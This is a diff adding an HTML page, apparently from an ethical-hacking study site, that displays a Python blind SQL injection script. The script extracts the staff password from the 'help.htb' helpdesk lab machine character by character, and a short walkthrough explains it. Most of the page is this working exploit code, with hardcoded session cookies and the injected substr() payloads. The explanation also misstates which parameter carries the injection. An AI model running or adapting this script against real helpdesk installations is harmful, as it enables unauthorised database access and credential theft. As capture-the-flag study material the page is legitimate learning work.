@@ -1,0 +1,58 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BlindSqlEnum.py</h1>
+    <p class="text"></p>
+
+<div class="code-box"><pre><code>import requests
+import string
+import sys
+
+cookies = {
+    "lang": "english",
+    "PHPSESSID": "2ua18hkd7h9pk44e3nr9dtjmp3",
+    "usrhash": "0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BF%2BSB7cv8hvRzpZX7Bthmz2NygIUCMcQlk5qJqAMBn5Zg%3D%3D"
+}
+
+
+base_url = 'http://help.htb/support/?v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6%20'
+chars = list(string.ascii_lowercase) + list(string.digits)
+password = []
+
+i = 1
+
+while i &amp;lt;= 40:
+    for j in chars:
+        url = base_url + f"AND%20substr((select%20password%20from%20staff%20limit%200,1),{i},1)%20=%20'{j}'"
+        response = requests.get(url,cookies=cookies)
+        data = response.text
+        if "Click to go back to the helpdesk home page" not in data:
+            password.append(j)
+            print("Found data : " + ''.join(password))
+            i += 1
+            break</code></pre></div>
+
+
+  <h1 class="title">What this script does (one line)</h1>
+  <p class="muted text"><strong>Brute-forces the first 40 characters of <code>staff.password</code> by sending substring checks in the <code>v</code> query parameter; when a guess changes the returned page (i.e. not the helpdesk 404), it records the character and moves to the next position.</strong></p>
+
+  <h2 class="subtitle">Quick walkthrough</h2>
+  <ul>
+    <li><code>cookies</code> — session cookies used for authenticated requests.</li>
+    <li><code>base_url</code> — fixed part of the <code>v=</code> parameter (already URL-encoded trailing space).</li>
+    <li><code>chars</code> — candidate characters to try: <code>a-z</code> and <code>0-9</code>.</li>
+    <li><code>i = 1</code> — current character position (MySQL <code>substr</code> is 1-based).</li>
+    <li>Outer loop: positions 1..40. Inner loop: try each character <code>j</code> for position <code>i</code>.</li>
+    <li>Build an encoded SQL test in the <code>v</code> value that checks <code>substr(..., i, 1) = 'j'</code> and send it.</li>
+    <li>If the page returned does <em>not</em> contain the helpdesk 404 text, treat that as a match → record <code>j</code>, print progress, increment <code>i</code>, and <code>break</code> to the next position.</li>
+  </ul>
+
+</body>
+</html>
